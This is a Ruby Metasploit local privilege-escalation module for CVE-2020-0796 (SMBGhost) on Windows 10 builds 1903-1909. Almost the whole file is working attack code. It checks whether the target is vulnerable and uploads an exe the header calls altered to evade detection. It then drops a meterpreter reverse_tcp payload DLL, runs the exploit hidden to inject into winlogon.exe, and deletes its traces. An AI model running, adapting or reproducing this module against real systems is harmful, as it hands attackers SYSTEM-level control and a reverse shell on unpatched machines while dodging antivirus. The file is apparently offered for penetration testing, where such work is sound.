##
# This implementation of cve-2020-0796 aka SMBGhost.
# This module made to be used when you have valid shell to escalate your privileges.
# Credits for exploit authers {Daniel García Gutiérrez,Manuel Blanco Parajón}.
# Credits also for Spencer McIntyre for his greate code too.
# Note: 
#  - You can change the payload, if you want to have your custom dll shellcode or if you want to encode it in some way.
#  - The exe file is edited to evade detection and made it applicable to run and inject the dll shellcode.
# Auther of this module: Ahmad Almorabea @almorabea
##
require 'msf/core/payload_generator'

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::EXE
  

  def initialize(info = {})
    super(
      update_info(
        info,
        {
          'Name' => 'SMBv3 Compression Integer Buffer Overflow',
          'Note' => 'We used dll in this modue to be injected, and run through Rundll32',
          'Description' => %q{
            A vulnerability exists within the Microsoft Server Message Block 3.1.1 (SMBv3) protocol that can be leveraged to
            execute code on a vulnerable server. This local exploit implementation leverages this flaw to elevate itself
            before injecting a payload into winlogon.exe.
          },
          'License' => MSF_LICENSE,
          'Author' => [
            
            'Ahmad Almorabea' # metasploit module
          ],
          'Arch' => [ ARCH_X64 ],
          'Platform' => 'win',
          'SessionTypes' => [ 'meterpreter' ],
          'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
          'Format' => 'dll'
        },

          'Targets' =>
        [
         
          [ 'Windows 10 v1903-1909 x64', { 'Arch' => ARCH_X64 } ]
        ],
          'Payload' =>
        {
          'DisableNops' => true,
          'Format' => 'dll',
          'Platform' => 'win',
          'Arch' =>'ARCH_X64',
          'payload' => 'windows/meterpreter/reverse_tcp'
        },
          'References' =>
        [
          [ 'CVE', '2020-0796' ],
          [ 'URL', 'https://github.com/danigargu/CVE-2020-0796' ],
          [ 'URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/adv200005' ]
        ],
          'DisclosureDate' => '2020-03-13',
          'DefaultTarget' => 0,
          'AKA' => [ 'SMBGhost', 'CoronaBlue'],
          'Notes' =>
        {
          'Stability' => [ CRASH_OS_RESTARTS, ],
          'Reliability' => [ REPEATABLE_SESSION, ]
        }
        }
      )
    )
  end

  def check
    sysinfo_value = sysinfo['OS']

    if sysinfo_value !~ /windows/i
      
      return Exploit::CheckCode::Safe
    end

    build_num = sysinfo_value.match(/\w+\d+\w+(\d+)/)[0].to_i
    vprint_status("Windows Build Number = #{build_num}")
   
    unless sysinfo_value =~ /10/ && (build_num >= 18362 && build_num <= 18363)
      print_error('The exploit only supports Windows 10 versions 1903 - 1909')
      return CheckCode::Safe
    end

    disable_compression = registry_getvaldata('HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters', 'DisableCompression')
    if !disable_compression.nil? && disable_compression != 0
      print_error('The exploit requires compression to be enabled')
      return CheckCode::Safe
    end

    CheckCode::Appears
  end

  def exploit
    
    super

    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if sysinfo['Architecture'] =~ /wow64/i
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    elsif sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64
      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
    end

    print_status('Starting process in the victim machine...')
   
    print_status("Preparing exploit in the victim machine ...")
    exploit_path = ::File.join(File.dirname(__FILE__), 'cve_2020_0796_payload.exe')
   
    upload_file("cve_2020_0796_payload.exe",exploit_path)

    
    print_status("Preparing Shellcode to be injected...")

    
    encoded_payload = generate_payload_dll(code: payload.generate)
    File.open(__dir__+"/log.dll", "w+") { |f| f.write  encoded_payload }

    library_path = ::File.join(File.dirname(__FILE__), 'log.dll')
    #library_path = ::File.expand_path(library_path)

    upload_file("c:/Users/Public/shell.dll",library_path)

    print_status("Injecting exploit...")
    
    print_status("Leaking Kernal Address..")

    exploit_process = client.sys.process.execute('cve_2020_0796_payload.exe', nil, { 'Hidden' => true })
    
    print_status("Exploit injected...")
    
    print_status("Retrieving Exploit pid #{exploit_process.pid}...")

    print_status("Retrieving Exploit handle #{exploit_process.handle}...")

    print_status("Retrieving Exploit Channel #{exploit_process.channel}...")

    rm_f('cve_2020_0796_payload.exe')
    rm_f('c:/Users/Public/shell.dll')
   
    print_status('Payload injected. Executing exploit...')
    
    print_good('Exploit finished, wait for payload execution to complete. if not! it could be stopped by WinDefend or a firewall')
  end

  

end
